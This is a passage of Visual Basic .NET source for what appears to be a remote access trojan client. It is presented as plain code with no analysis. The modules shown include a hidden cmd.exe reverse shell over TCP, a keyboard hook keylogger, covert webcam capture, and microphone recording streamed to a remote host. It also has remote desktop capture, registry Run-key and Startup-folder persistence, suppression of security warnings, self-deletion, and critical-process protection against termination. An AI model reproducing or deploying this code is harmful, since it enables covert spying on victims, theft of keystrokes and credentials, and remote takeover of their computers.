                Return Registry.ClassesRoot
            Case 2 'HKEY_CURRENT_USER
                Return Registry.CurrentUser
            Case 3 'HKEY_LOCAL_MACHINE
                Return Registry.LocalMachine
            Case 4 'HKEY_USERS
                Return Registry.Users
            Case 5 'HKEY_CURRENT_CONFIG
                Return Registry.CurrentConfig
            Case 6
                Return Registry.DynData
            Case 7
                Return Registry.PerformanceData
        End Select
        Return Nothing
    End Function
    Public Shared Function IdentifyValueType(ByVal ValueIdentifier As Integer) As RegistryValueKind
        On Error Resume Next
        Select Case ValueIdentifier
            Case 1 'REG_BINARY
                Return RegistryValueKind.Binary
            Case 2 'REG_DWORD
                Return RegistryValueKind.DWord
            Case 3 'REG_SZ
                Return RegistryValueKind.String
            Case 4 'REG_EXPAND_SZ
                Return RegistryValueKind.ExpandString
            Case 5
                Return RegistryValueKind.MultiString
            Case 6
                Return RegistryValueKind.QWord
        End Select
        Return Nothing
    End Function
#End Region

End Class

#End Region

#Region " Remote CMD "

Public Class RemoteCMD

#Region " Declarations "
    Public Shared cmd As Process
    Private InCMD As StreamWriter
    Private OutCMD As StreamReader
    Private CmdClient As TcpClient
    Private CmdStream As NetworkStream
    Private Const RemoteCMD = 8
#End Region

#Region " Startup "
    Public Sub New(ByVal id As String, ByVal host As String, ByVal port As Integer)
        Try
            CmdClient = New TcpClient : CmdClient.Connect(host, port) : CmdClient.Client.Send(System.Text.Encoding.UTF8.GetBytes(Chr(RemoteCMD) & MainModule.SplitMark1 & id))
            CmdStream = CmdClient.GetStream
            StartCmd()
        Catch
        End Try
    End Sub

#End Region

#Region " Actions "
    Public Sub StartCmd()
        Try
            cmd = New Process()
            cmd.StartInfo.FileName = "cmd.exe"
            cmd.StartInfo.UseShellExecute = False
            cmd.StartInfo.RedirectStandardInput = True
            cmd.StartInfo.RedirectStandardOutput = True
            cmd.StartInfo.CreateNoWindow = True
            cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
            cmd.Start()
            InCMD = cmd.StandardInput
            OutCMD = cmd.StandardOutput
            Dim thr As New Thread(AddressOf ReadCMD)
            thr.SetApartmentState(ApartmentState.STA)
            thr.Start()
        Catch
        End Try
    End Sub
    Public Sub ReadCMD()
        Dim B() As Byte
        Try
            SendStatus("CMD opened successfully")
            While Not cmd.HasExited
                Thread.Sleep(2)
                B = System.Text.Encoding.UTF8.GetBytes(cmd.StandardOutput.ReadLine & vbNewLine)
                CmdStream.Write(B, 0, B.Length)
                B = Nothing
            End While
        Catch

        End Try
    End Sub
    Public Sub SendDataToCMD(ByVal data As String)
        Try
            InCMD.WriteLine(data + Environment.NewLine)
        Catch ex As Exception
        End Try
    End Sub
    Public Sub StopCmd()
        On Error Resume Next
        InCMD.Close()
        OutCMD.Close()
        cmd.Kill()
    End Sub
#End Region

End Class

#End Region

#Region " Window Managing "
Public Class WindowManaging

#Region " Declare Functions "
    Private Declare Function SendMessageA Lib "user32" (ByVal Hwnd As IntPtr, ByVal Message As Integer, ByVal wParam As Integer, ByVal lParam As Integer) As Integer
    Declare Function EnableWindow Lib "user32" (ByVal hwnd As Int32, ByVal nOption As Int32) As Int32
    Private Declare Function GetForegroundWindow Lib "user32.dll" () As IntPtr
    Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Integer
    Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
    Public Delegate Function CallBack(ByVal hwnd As IntPtr, ByVal lParam As Integer) As Boolean
    Public Declare Function EnumWindows Lib "user32" (ByVal Adress As CallBack, ByVal y As Integer) As Integer
    Public Declare Function IsWindowVisible Lib "user32.dll" (ByVal hwnd As IntPtr) As Boolean
    Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Integer, ByVal lpWindowText As String, ByVal cch As Integer) As Integer
    Private Shared ActiveWindows As New ObjectModel.Collection(Of IntPtr)

    Private Const Windows = 11
#End Region

#Region " Sending/Recieving Windows "

    Public Shared Sub SendWindows(ByVal ID As String)
        Try
            MainModule.Send(Chr(Windows) & GetWindows())
        Catch
        End Try
    End Sub

    Public Shared Function GetWindows() As String
        On Error Resume Next
        Dim VisibleWindow As String = Nothing
        Dim inVisibleWindow As String = Nothing
        ActiveWindows.Clear()
        For Each i In GetActiveWindows()
            Dim windtitle As String = GetWindowtitle(i).Trim(Chr(0))
            If Not windtitle = Nothing Then
                If IsWindowVisible(i) Then
                    VisibleWindow += i.ToString & MainModule.SplitMark1 & Chr(&H1) & MainModule.SplitMark1 & GetWindowtitle(i) & MainModule.splitMark2
                Else
                    inVisibleWindow += i.ToString & MainModule.SplitMark1 & Chr(&H0) & MainModule.SplitMark1 & GetWindowtitle(i) & MainModule.splitMark2
                End If
            End If
        Next
        Return VisibleWindow & inVisibleWindow
    End Function

    Public Shared Function GetWindowtitle(ByVal hwnd As IntPtr) As String
        On Error Resume Next
        Dim Text As String = Space(Int16.MaxValue)
        GetWindowText(hwnd, Text, Int16.MaxValue)
        Return Text.Trim
    End Function

    Public Shared Function GetActiveWindows() As ObjectModel.Collection(Of IntPtr)
        On Error Resume Next
        EnumWindows(AddressOf Enumerator, 0)
        Return ActiveWindows
    End Function

#End Region

#Region " Actions "

    Private Shared Function Enumerator(ByVal Hwnd As IntPtr, ByVal lParam As Integer) As Boolean
        On Error Resume Next
        ActiveWindows.Add(Hwnd)
        Return True
    End Function

    Public Shared Function FreezeWindow(ByVal handle As IntPtr) As Boolean
        Try
            Return EnableWindow(CInt(handle), 0)
        Catch
            Return False
        End Try
    End Function

    Public Shared Function UnfreezeWindow(ByVal handle As IntPtr) As Boolean
        Try
            Return EnableWindow(CInt(handle), 1)
        Catch
            Return False
        End Try
    End Function
    Declare Auto Function SetWindowText Lib "user32" (ByVal hWnd As IntPtr, ByVal lpstring As String) As Boolean

    Public Shared Function SetText(ByVal handle As IntPtr, ByVal text As String) As Boolean
        Try
            Return SetWindowText(handle, text)
        Catch
            Return False
        End Try
    End Function

    Public Shared Function WindowShow(ByVal handle As IntPtr) As Boolean
        Try
            ShowWindow(handle, 5)
        Catch
            Return False
        End Try
        Return False
    End Function

    Public Shared Function WindowHide(ByVal handle As IntPtr) As Boolean
        Try
            ShowWindow(handle, 0)
        Catch
            Return False
        End Try
        Return False
    End Function

    Public Shared Function CloseWindow(ByVal handle As IntPtr) As Boolean
        Try
            SendMessageA(handle, &H10, 0, 0)
            Return Nothing
        Catch
            Return False
        End Try
    End Function

    Public Shared Function MinimizeWindow(ByVal handle As IntPtr) As Boolean
        Try
            Return ShowWindow(handle, 6)
        Catch
            Return False
        End Try
    End Function

    Public Shared Function RestoreWindow(ByVal handle As IntPtr) As Boolean
        Try
            Return ShowWindow(handle, 9)
        Catch
            Return False
        End Try
    End Function

    Public Shared Function GetActiveWindow() As String
        Try
            Return GetForegroundWindow()
        Catch
            Return Nothing
        End Try
    End Function

#End Region
End Class

#End Region

#Region " Cam Control "

Public Class CamControl
    Const WM_CAP As Short = &H400S
    Const WM_CAP_DRIVER_CONNECT As Integer = WM_CAP + 10
    Const WM_CAP_DRIVER_DISCONNECT As Integer = WM_CAP + 11
    Const WM_CAP_SET_PREVIEW As Integer = WM_CAP + 50
    Const WM_CAP_SET_PREVIEWRATE As Integer = WM_CAP + 52
    Const WM_CAP_SET_SCALE As Integer = WM_CAP + 53
    Const WS_CHILD As Integer = &H40000000
    Const WS_VISIBLE As Integer = &H10000000
    Const SWP_NOMOVE As Short = &H2S
    Const SWP_NOZORDER As Short = &H4S
    Const HWND_BOTTOM As Short = 1
    Private Declare Function capCreateCaptureWindowA Lib "avicap32.dll" (ByVal lpszWindowName As String, ByVal dwStyle As Integer, ByVal x As Integer, ByVal y As Integer, ByVal nWidth As Integer, ByVal nHeight As Short, ByVal hWndParent As Integer, ByVal nID As Integer) As Integer
    Private Declare Function capGetDriverDescriptionA Lib "avicap32.dll" (ByVal wDriver As Short, ByVal lpszName As String, ByVal cbName As Integer, ByVal lpszVer As String, ByVal cbVer As Integer) As Boolean
    Function DestroyWindow(ByVal hwnd As Integer) As Boolean
    End Function
    Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Integer, ByVal Msg As Integer, ByVal wParam As Integer, <MarshalAs(UnmanagedType.AsAny)> ByVal lParam As Object) As Integer
    Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
    Private Declare Auto Function GetDesktopWindow Lib "user32.dll" () As IntPtr
    Private Const DeviceID As Integer = 0
    Private hHwnd As Integer = 0
    Private Shared ListOfDevices As New ArrayList()
    Public ReadOnly Property DeviceCount() As Integer
        Get
            Return ListOfDevices.Count
        End Get
    End Property
    Public Shared Sub Loaddevices()
        Try
            ListOfDevices.Clear()
            Dim Name As String = Space(80)
            Dim Version As String = Space(80)
            Dim EndOfDeviceList As Boolean = False
            Dim index As Short = 0
            Do
                EndOfDeviceList = capGetDriverDescriptionA(index, Name, 80, Version, 80)
                If EndOfDeviceList Then
                    ListOfDevices.Add(Name.Trim())
                End If
                index += 1
            Loop While Not (EndOfDeviceList = False)
        Catch ex As Exception : End Try
    End Sub
    Public Shared Function HasCam() As Integer
        On Error Resume Next
        Loaddevices()
        If ListOfDevices.Count > 0 Then
            Return 2
        Else
            Return 1
        End If
    End Function
    Public Function OpenConnection() As IntPtr
        Try
            hHwnd = capCreateCaptureWindowA(DeviceID, WS_VISIBLE Or WS_CHILD, -400, -300, 250, 180, GetDesktopWindow.ToInt32, 0)
            If SendMessage(hHwnd, WM_CAP_DRIVER_CONNECT, DeviceID, 0) Then
                SendMessage(hHwnd, WM_CAP_SET_SCALE, True, 0)
                SendMessage(hHwnd, WM_CAP_SET_PREVIEWRATE, 66, 0)
                SendMessage(hHwnd, WM_CAP_SET_PREVIEW, True, 0)
                SetWindowPos(hHwnd, HWND_BOTTOM, -400, -300, 250, 180, SWP_NOMOVE Or SWP_NOZORDER)
                Return hHwnd
            Else
                DestroyWindow(hHwnd)
                CloseConnection()
                Return IntPtr.Zero
            End If
        Catch ex As Exception : End Try
    End Function
    Private Sub ClosePreviewWindow()
        Try
            SendMessage(hHwnd, WM_CAP_DRIVER_DISCONNECT, DeviceID, 0)
            DestroyWindow(hHwnd)
        Catch ex As Exception : End Try
    End Sub
    Public Sub CloseConnection()
        Try
            DestroyWindow(hHwnd)
            SendMessage(hHwnd, WM_CAP_DRIVER_DISCONNECT, DeviceID, 0)
            DestroyWindow(hHwnd)
            WindowManaging.CloseWindow(hHwnd)
        Catch ex As Exception

        End Try
    End Sub
End Class

#End Region

#Region " Encryption "
Public Class Encryption

#Region "Encrypt"
    Public Function Encrypt(ByVal pass As String, ByVal input As String) As String

        Dim AES As New RijndaelManaged
        Dim Hash_AES As New MD5CryptoServiceProvider
        Dim encrypted As String = ""
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(ASCIIEncoding.ASCII.GetBytes(pass))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = CipherMode.ECB
            Dim DESEncrypter As ICryptoTransform = AES.CreateEncryptor
            Dim Buffer As Byte() = ASCIIEncoding.ASCII.GetBytes(input)
            encrypted = Convert.ToBase64String(DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Return encrypted
        Catch ex As Exception
            Return Nothing
        End Try
    End Function
#End Region

#Region "Decrypt"
    Public Function Decrypt(ByVal pass As String, ByVal input As String) As String
        Dim aes As New RijndaelManaged
        Dim Hash_AES As New MD5CryptoServiceProvider
        Dim decrypted As String = ""
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(ASCIIEncoding.ASCII.GetBytes(pass))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            aes.Key = hash
            aes.Mode = CipherMode.ECB
            Dim DESDecrypter As ICryptoTransform = aes.CreateDecryptor
            Dim Buffer As Byte() = Convert.FromBase64String(input)
            decrypted = ASCIIEncoding.ASCII.GetString(DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Return decrypted
        Catch ex As Exception
            Return Nothing
        End Try
    End Function
#End Region

    Public Function RXOREncrypt(data As String, key As String) As String
        Return Convert.ToBase64String(RXOR(System.Text.Encoding.UTF8.GetBytes(data), key))
    End Function

    Public Function RXORDecrypt(data As String, key As String) As String
        Return System.Text.Encoding.UTF8.GetString(RXOR(Convert.FromBase64String(data), key))
    End Function

    Public Function RXOR(data As Byte(), keys As String) As Byte()
        Dim N1 As Integer = 11
        Dim N2 As Integer = 13
        Dim NS As Integer = 257

        Dim Key As Byte() = System.Text.Encoding.UTF8.GetBytes(keys)

        For I As Integer = 0 To Key.Length - 1
            NS += NS Mod (Key(I) + 1)
        Next

        Dim T(data.Length - 1) As Byte
        For I As Integer = 0 To data.Length - 1
            NS = Key(I Mod Key.Length) + NS
            N1 = (NS + 5) * (N1 And 255) + (N1 >> 8)
            N2 = (NS + 7) * (N2 And 255) + (N2 >> 8)
            NS = ((N1 << 8) + N2) And 255

            T(I) = data(I) Xor CByte(NS)
        Next

        Return T
    End Function

End Class

#End Region

#Region " Installation "

Public Class Installation
    Public Shared _fileName As String
    Public Shared _folderName As String
    Public Shared _keyName As String
    Public Shared InstallationPath As String
    Public Shared Sub Install(ByVal file As String, ByVal folder As String, ByVal key As String, ByVal I As InstallArea)
        On Error Resume Next
        _fileName = file
        _folderName = folder
        _keyName = key
        CopyFile(file, folder)
        Select Case I
            Case InstallArea.Hkcu
HKCU:
                Dim R As RegistryKey
                R = Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
                R.SetValue(key, InstallationPath & folder & "\" & file, RegistryValueKind.String)
                R.Close()
            Case InstallArea.Hklm
                On Error GoTo HKCU
                Dim R As RegistryKey
                R = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
                R.SetValue(key, InstallationPath & folder & "\" & file, RegistryValueKind.String)
                R.Close()
            Case InstallArea.StartupDir
                IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & file)
        End Select
    End Sub
    Public Shared Sub RegPersistence()
        Try
            Do
                Install(compilerSettings.installationFileName, compilerSettings.installationFolderName, compilerSettings.hkcuServerName, InstallArea.Hkcu)
                Thread.Sleep(2000)
            Loop
        Catch ex As Exception
        End Try
    End Sub
    Public Shared Sub UninstallServer()
        On Error Resume Next
        Dim currentUserKey As RegistryKey
        currentUserKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
        currentUserKey.DeleteValue(_keyName)
        currentUserKey.Close()
        Dim localMachineKey As RegistryKey
        localMachineKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
        localMachineKey.DeleteValue(_keyName)
        localMachineKey.Close()

        Selfdestruct(Application.ExecutablePath)
        If compilerSettings.enableInstallation = True Then
            If IO.Directory.Exists(InstallationPath & _folderName & "\") Then
                IO.Directory.Delete(InstallationPath & _folderName & "\", True)
            End If
            File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & _fileName)
        End If
    End Sub
    Public Shared Sub CopyFile(ByVal name As String, ByVal folder As String)
        On Error Resume Next
        If Directory.Exists(InstallationPath & folder) Then
            Directory.Delete(InstallationPath & folder, True)
        End If
        If Not Directory.Exists(InstallationPath & folder) Then
            Directory.CreateDirectory(InstallationPath & folder)
        End If
        File.Copy(Application.ExecutablePath, InstallationPath & folder & "\" & name)
    End Sub

    Public Shared Sub DisableWarning(ByVal path As String, ByVal name As String)
        Try
            Dim proc As New Process
            Dim startInfo As New ProcessStartInfo
            startInfo.FileName = "cmd"
            startInfo.RedirectStandardInput = True
            startInfo.RedirectStandardOutput = True
            startInfo.UseShellExecute = False
            startInfo.CreateNoWindow = True
            proc.StartInfo = startInfo
            proc.Start()
            Dim w As StreamWriter = proc.StandardInput
            w.WriteLine("echo [zoneTransfer]ZoneID = 2 > " & Application.ExecutablePath & ":ZONE.identifier")
            w.WriteLine("exit")
            w.Close()
            Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", 1, EnvironmentVariableTarget.User)
        Catch
            Try
                Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", 1, EnvironmentVariableTarget.User)
            Catch
            End Try
        End Try
    End Sub
    Public Enum InstallArea
        Hkcu
        Hklm
        Explorer
        StartupDir
    End Enum
    Public Shared Sub Selfdestruct(ByVal filepath As String)
        On Error Resume Next
        Dim info As ProcessStartInfo = New ProcessStartInfo()
        info.Arguments = "/C ping 1.1.1.1 -n 1 -w 100 > Nul & Del """ & filepath & """"
        info.WindowStyle = ProcessWindowStyle.Hidden
        info.CreateNoWindow = True
        info.FileName = "cmd.exe"
        Process.Start(info)
    End Sub
End Class

#End Region

#Region " Key Hook "

Public Class KeyHook

#Region "KeyHook"
    Public Function ReturnWindowText() As String
        On Error Resume Next
        Dim E2 As New Encryption
        Return E2.Decrypt("IM", "iSauTklmSqJrNgOyjIBmTg==")
    End Function
    Private Structure kstruct
        Public vkCode As Integer
        Public Scancode As Integer
        Public flags As Integer
        Public time As Integer
        Public dwExtraInfo As Integer
    End Structure

    Private Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal idHook As Integer, ByVal lpfn As KBPDL, ByVal hmod As Integer, ByVal dwThreadId As Integer) As Integer
    Private Declare Function CallNextHookEx Lib "user32" (ByVal hk As Integer, ByVal nCode As Integer, ByVal wParam As Integer, ByVal lParam As kstruct) As Integer
    Private Declare Function UnhookWindowsHookEx Lib "user32" (ByVal hk As Integer) As Integer
    Private Delegate Function KBPDL(ByVal nCode As Integer, ByVal wParam As Integer, ByRef lParam As kstruct) As Integer
    Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Integer, ByRef lpWindowText As String, ByVal cch As Integer) As Integer
    Private Declare Function GetForegroundWindow Lib "user32.dll" () As IntPtr
    <DllImport("kernel32.dll", CharSet:=CharSet.Auto, SetLastError:=True)> Private Shared Function GetModuleHandle(ByVal lpModuleName As String) As IntPtr
    End Function
    <DllImport("user32.dll", SetLastError:=True)> Private Shared Function GetWindowThreadProcessId(ByVal hwnd As IntPtr, ByRef lpdwProcessId As Integer) As Integer
    End Function

    Public Event KD(ByVal Key As Keys)
    Public Event KU(ByVal Key As Keys)
    Public Event WindowChange(ByVal Caption As String)
    Private Shared KHK As Integer
    Private Shared KHD As KBPDL
    Public Sub Hook()
        On Error Resume Next
        KHD = New KBPDL(AddressOf KeyboardProc)
        KHK = SetWindowsHookEx(13, KHD, GetModuleHandle(0), 0)
        If KHK = 0 Then
            Dim ModH As IntPtr = Environment.GetCommandLineArgs(1)
            KHD = New KBPDL(AddressOf KeyboardProc)
            KHK = SetWindowsHookEx(13, KHD, ModH, 0)
        End If
    End Sub

    Private Function KeyboardProc(ByVal nCode As Integer, ByVal wParam As Integer, ByRef lParam As kstruct) As Integer
        On Error Resume Next
        If (nCode = 0) Then
            Select Case wParam
                Case &H100, &H104
                    RaiseEvent KD(CType(lParam.vkCode, Keys))
                Case &H101, &H105
                    RaiseEvent KU(CType(lParam.vkCode, Keys))
            End Select
        End If
        Return CallNextHookEx(KHK, nCode, wParam, lParam)
    End Function

    Public Sub Unhook()
        On Error Resume Next
        UnhookWindowsHookEx(KHK)
        MyBase.Finalize()
    End Sub

    Public Function Feed(ByVal eCode As Keys) As String
        On Error Resume Next
        Select Case eCode
            Case 65 To 90
                If Control.IsKeyLocked(Keys.CapsLock) Then
                    Return eCode.ToString
                ElseIf (Control.ModifierKeys And Keys.Shift) <> 0 Then
                    Return eCode.ToString
                Else
                    Return eCode.ToString.ToLower
                End If
            Case 48 To 57
                If (Control.ModifierKeys And Keys.Shift) <> 0 Then
                    Select Case eCode.ToString
                        Case "D1"
                            Return "!"
                        Case "D2"
                            Return "@"
                        Case "D3"
                            Return "#"
                        Case "D4"
                            Return "$"
                        Case "D5"
                            Return "%"
                        Case "D6"
                            Return "^"
                        Case "D7"
                            Return "&"
                        Case "D8"
                            Return "*"
                        Case "D9"
                            Return "("
                        Case "D0"
                            Return ")"
                    End Select
                Else
                    Dim Control As String = eCode.ToString
                    Control = Control.Replace("D", "")
                    Return Control
                End If
            Case 96 To 105
                Dim Control As String = eCode.ToString
                Control = Control.Replace("NumPad", "")
                Return Control
            Case 106 To 111
                Select Case eCode.ToString
                    Case "Divide"
                        Return "/"
                    Case "Multiply"
                        Return "*"
                    Case "Subtract"
                        Return "-"
                    Case "Add"
                        Return "+"
                    Case "Decimal"
                        Return "."
                End Select
            Case 32
                Return " "
            Case 186 To 222
                If (Control.ModifierKeys And Keys.Shift) <> 0 Then
                    Select Case eCode.ToString
                        Case "OemMinus"
                            Return "_"
                        Case "Oemplus"
                            Return "+"
                        Case "OemOpenBrackets"
                            Return "{"
                        Case "Oem6"
                            Return "}"
                        Case "Oem5"
                            Return "|"
                        Case "Oem1"
                            Return ":"
                        Case "Oem7"
                            Return """"
                        Case "Oemcomma"
                            Return "<"
                        Case "OemPeriod"
                            Return ">"
                        Case "OemQuestion"
                            Return "?"
                        Case "Oemtilde"
                            Return "~"
                    End Select
                Else
                    Select Case eCode.ToString
                        Case "OemMinus"
                            Return "-"
                        Case "Oemplus"
                            Return "="
                        Case "OemOpenBrackets"
                            Return "["
                        Case "Oem6"
                            Return "]"
                        Case "Oem5"
                            Return "\"
                        Case "Oem1"
                            Return ";"
                        Case "Oem7"
                            Return "'"
                        Case "Oemcomma"
                            Return ","
                        Case "OemPeriod"
                            Return "."
                        Case "OemQuestion"
                            Return "/"
                        Case "Oemtilde"
                            Return "`"
                    End Select
                End If
            Case 16 To 17
                Return Nothing
            Case 160 To 162
                Return Nothing
            Case Keys.Return
                Return "<Enter>"
            Case Keys.Back
                Return "<Back>"
            Case Keys.LControlKey
                Return "<LCTRL>"
            Case Keys.RControlKey
                Return "<RCTRL>"
            Case Else
                Return "<" + eCode.ToString + ">"
        End Select
        Return Nothing
    End Function
#End Region

End Class

#End Region

#Region " Self Protection "

Public Class SelfProtection
    <DllImport("advapi32.dll", SetLastError:=True)> Private Shared Function SetKernelObjectSecurity(ByVal Handle As IntPtr, ByVal securityInformation As Integer, <[In]()> ByVal pSecurityDescriptor As Byte()) As Boolean
    End Function
    <DllImport("ntdll")> Private Shared Function NtSetInformationProcess(ByVal hProcess As IntPtr, ByVal processInformationClass As Integer, ByRef processInformation As Integer, ByVal processInformationLength As Integer) As Integer
    End Function
    <DllImport("kernel32.dll")> Public Shared Function GetCurrentProcess() As IntPtr
    End Function
    <DllImport("advapi32.dll", SetLastError:=True)> Private Shared Function GetKernelObjectSecurity(ByVal Handle As IntPtr, ByVal securityInformation As Integer, <Out()> ByVal pSecurityDescriptor As Byte(), ByVal nLength As UInteger, ByRef lpnLengthNeeded As UInteger) As Boolean
    End Function
    Public Shared Function GetProcessSecurityDescriptor(ByVal processHandle As IntPtr) As RawSecurityDescriptor
        On Error Resume Next
        Dim array As Byte() = New Byte(-1) {}
        Dim num As UInteger
        GetKernelObjectSecurity(processHandle, 4, array, 0UI, num)
        If CULng(num) > 32767UL Then
            Throw New Win32Exception()
        End If
        If Not GetKernelObjectSecurity(processHandle, 4, InlineAssignHelper(array, New Byte(CInt(CType(num, UIntPtr)) - 1) {}), num, num) Then
            Throw New Win32Exception()
        End If
        Return New RawSecurityDescriptor(array, 0)
    End Function
    Public Shared Sub ProtectProcess()
        On Error Resume Next
        Dim currentProcess As IntPtr = GetCurrentProcess()
        Dim processSecurityDescriptor As RawSecurityDescriptor = GetProcessSecurityDescriptor(currentProcess)
        processSecurityDescriptor.DiscretionaryAcl.InsertAce(0, New CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, New SecurityIdentifier(WellKnownSidType.WorldSid, Nothing), False, Nothing))
        SetProcessSecurityDescriptor(currentProcess, processSecurityDescriptor)
    End Sub

    Public Shared Sub UnProtectProcess()
        On Error Resume Next
        Dim currentProcess As IntPtr = GetCurrentProcess()
        Dim processSecurityDescriptor As RawSecurityDescriptor = GetProcessSecurityDescriptor(currentProcess)
        processSecurityDescriptor.DiscretionaryAcl.InsertAce(0, New CommonAce(AceFlags.None, AceQualifier.AccessAllowed, 2035711, New SecurityIdentifier(WellKnownSidType.WorldSid, Nothing), False, Nothing))
        SetProcessSecurityDescriptor(currentProcess, processSecurityDescriptor)
    End Sub

    Public Shared Sub SetProcessSecurityDescriptor(ByVal processHandle As IntPtr, ByVal dacl As RawSecurityDescriptor)
        On Error Resume Next
        Dim array As Byte() = New Byte(dacl.BinaryLength - 1) {}
        dacl.GetBinaryForm(array, 0)
        If Not SetKernelObjectSecurity(processHandle, 4, array) Then
        End If
    End Sub
    Private Shared Function InlineAssignHelper(Of T)(ByRef target As T, ByVal value As T) As T
        On Error Resume Next
        target = value
        Return value
    End Function
    Public Shared Sub BsodProtect()
        On Error Resume Next
        Process.EnterDebugMode()
        Dim prot As Integer = 1
        NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, prot, Marshal.SizeOf(prot))
    End Sub
    Public Shared Sub BSODUnProtect()
        On Error Resume Next
        Process.LeaveDebugMode()
        Dim unprot As Integer = 0
        NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, unprot, Marshal.SizeOf(unprot))
    End Sub
End Class

#End Region

#Region " Microphone "

Public Class Microphone

#Region "Variables and API"
    Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Integer, ByVal hwndCallback As Integer) As Integer
    Private ReadOnly connectionId As Integer
    Private sampleLength As Integer
    Private StreamThread As Thread
    Private Const ListenMicrophone = 5
#End Region

#Region "Sub New"
    Public Sub New(ByVal Options As String)
        Try
            connectionId = Options.Split(SplitMark1)(2)
            sampleLength = Options.Split(SplitMark1)(3)
            StreamThread = New Thread(AddressOf StartMicStream)
            StreamThread.IsBackground = True
            StreamThread.SetApartmentState(ApartmentState.STA)
            StreamThread.Start()
        Catch ex As Exception
        End Try
    End Sub
#End Region

#Region "Stream audio captures"
    Public Sub StartMicStream()
        Dim microphoneStream As Stream
        Try
            Dim micClient = New TcpClient(compilerSettings.remoteHost, compilerSettings.remotePort)
            micClient.SendBufferSize = 1024
            micClient.Client.Send(System.Text.Encoding.UTF8.GetBytes(Chr(ListenMicrophone) & SplitMark1 & connectionId))
            micClient.SendBufferSize = 52400
            microphoneStream = micClient.GetStream()
            Do While micClient.Connected
                Dim Msecs As Integer = New Random().Next(1, 80000)
                Dim micpath As String = My.Computer.FileSystem.SpecialDirectories.Temp & "\" & Msecs & ".wav"
                mciSendString("open new Type waveaudio Alias recsound", "", 0, 0)
                mciSendString("record recsound", "", 0, 0)
                Thread.Sleep(sampleLength)
                mciSendString("save recsound " & micpath, "", 0, 0)
                mciSendString("close recsound", "", 0, 0)
                Dim bytes() As Byte = Compress(File.ReadAllBytes(micpath))
                Dim b As New BinaryFormatter
                b.Serialize(microphoneStream, bytes)
                Try
                    If File.Exists(micpath) Then
                        File.Delete(micpath)
                    End If
                Catch
                End Try
            Loop
            StreamThread.Abort()
            micClient.Close()
            microphoneStream.Close()
            microphoneStream.Dispose()
            Exit Sub
        Catch ex As Exception
            microphoneStream.Close()
            microphoneStream.Dispose()
            Exit Sub
        End Try
    End Sub
#End Region

#Region "Compression"
    Private Shared Function Compress(ByVal unZippedData() As Byte) As Byte()
        Try
            Dim ms As New MemoryStream()
            Dim gZip As New Compression.GZipStream(ms, Compression.CompressionMode.Compress)
            gZip.Write(unZippedData, 0, unZippedData.Length)
            gZip.Close()
            Dim zippedData As Byte()
            zippedData = ms.ToArray()
            ms.Close()
            gZip.Dispose()
            ms.Dispose()
            Return zippedData
        Catch ex As Exception
        Finally
        End Try
        Return Nothing
    End Function
#End Region

End Class

#End Region

#Region " Remote Desktop "

Public Class RemoteDesktop

#Region "Variables"
    Private Const RemoteDesktop = 2
    Private Const Api = 1
    Private Const Gdi = 2
    Private connectionId As Integer
    Private RemoteIP As String
    Private RemotePort As Integer
    Private SendThread As Thread
    Public Shared jpegByteSize As String
#End Region

#Region "APIs"


#End Region

#Region "Declarations & Enums"
    Dim connectionClient As TcpClient
    Public Shared Quality As Integer = 55
    Dim resizePercent As Double = 1
    Public Shared ShowCursor As Integer = 1
    Public Shared Src As Screen = Screen.AllScreens(0)
    Public Shared Scr As Integer = 1
    Public Structure Compressions
        Dim UseLzw As Integer
        Dim UseRle As Integer
    End Structure

    Public Enum MethodEnum
        API = 1
        GDI = 2
    End Enum

    Public Enum DeskColor
        Bit32 = 32
        Bit24 = 24
        Bit16 = 16
        Bit8 = 8
        Gray = 1
    End Enum
    Public Sub New(ByVal id As Integer, ByVal IP As String, ByVal port As String, ByVal CommandString As String)
        Try
            RemoteIP = IP
            RemotePort = port
            connectionId = id
            captureMethod = Asc(CommandString.Substring(0, 1))
            Quality = Asc(CommandString.Substring(1, 1))
            resizePercent = Asc(CommandString.Substring(2, 1)) / 100
            ShowCursor = Asc(CommandString.Substring(5, 1))
            Scr = Asc(CommandString.Substring(6, 1))
            Src = Screen.AllScreens(Scr - 1)
            SendThread = New Thread(AddressOf SendScreenThread)
            SendThread.IsBackground = True
            SendThread.SetApartmentState(ApartmentState.STA)
